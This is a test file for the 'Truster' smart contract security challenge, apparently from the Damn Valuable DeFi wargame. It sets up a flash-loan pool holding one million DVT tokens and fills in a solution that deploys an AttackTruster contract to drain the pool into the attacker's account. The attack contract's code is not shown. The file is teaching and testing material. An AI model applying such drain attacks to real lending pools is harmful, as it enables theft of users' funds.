/**
 * More and more lending pools are offering flash loans.
 * In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
 *
 * Currently the pool has 1 million DVT tokens in balance. And you have nothing.
 *
 * But don't worry, you might be able to take them all from the pool. In a single transaction.
 */

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory(
      'DamnValuableToken',
      deployer
    );
    const TrusterLenderPool = await ethers.getContractFactory(
      'TrusterLenderPool',
      deployer
    );

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal('0');
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const AttackTrusterContract = await ethers.getContractFactory(
      'AttackTruster',
      attacker
    );
    this.attackContract = await AttackTrusterContract.deploy();

    await this.attackContract
      .connect(attacker)
      .attackTruster(this.token.address, this.pool.address, attacker.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.equal('0');
  });
});
